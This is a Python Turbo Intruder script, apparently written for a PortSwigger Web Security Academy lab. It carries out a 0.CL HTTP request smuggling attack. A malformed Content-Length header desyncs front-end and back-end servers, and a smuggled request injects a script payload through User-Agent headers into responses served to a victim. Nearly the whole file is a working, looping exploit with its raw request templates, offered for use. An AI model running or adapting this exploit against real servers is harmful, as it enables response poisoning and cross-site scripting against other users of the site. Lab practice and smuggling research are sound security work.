# Refer to https://portswigger.net/research/http1-must-die
# nu11secur1ty 2025

# Burb post 
#GET / HTTP/1.1
#Content-Type: application/x-www-form-urlencoded
#Content-Length: 136
#X: YGET /404 HTTP/1.1
#Host: your_host_.web-security-academy.net
#User-Agent: foo
#Content-Type: application/x-www-form-urlencoded
#Connection: keep-alive

#GET /post?postId=10 HTTP/1.1
#User-Agent: yu5md"><script>alert(1)</script>hgpov
#user-agent: yu5md"><script>alert(1)</script>hgpov
#X: Y

import time

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )

    stage1 = "POST /resources/images/avatarDefault.svg HTTP/1.1\r\n" + \
             "Host: " + host + "\r\n" + \
             "Content-Type: application/x-www-form-urlencoded\r\n" + \
             "Connection: keep-alive\r\n" + \
             "Content-Length : %s\r\n\r\n"

    smuggled = "GET /post?postId=10 HTTP/1.1\r\n" + \
               "User-Agent: yu5md\"><script>alert(1)</script>hgpov\r\n" + \
               "user-agent: yu5md\"><script>alert(1)</script>hgpov\r\n" + \
               "X: Y"

    stage2_chopped = "GET / HTTP/1.1\r\n" + \
                     "Content-Type: application/x-www-form-urlencoded\r\n" + \
                     "Content-Length: 123\r\n" + \
                     "X: Y"

    stage2_revealed = "GET /404 HTTP/1.1\r\n" + \
                      "Host: " + host + "\r\n" + \
                      "User-Agent: foo\r\n" + \
                      "Content-Type: application/x-www-form-urlencoded\r\n" + \
                      "Connection: keep-alive\r\n\r\n"

    victim = "GET / HTTP/1.1\r\n" + \
             "Host: " + host + "\r\n" + \
             "User-Agent: foo\r\n\r\n"

    if '%s' not in stage1:
        raise Exception('Please place %s in the Content-Length header value')

    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 request must end with a blank line and have no body')

    while True:
        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        time.sleep(0.8)
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    table.add(req)

    # 0.CL attacks use a double desync so they can take a while!
    # Uncomment & customise this if you want the attack to automatically stop on success
    #if req.label == 'victim' and 'hgpov' in req.response:
    #    req.engine.cancel()
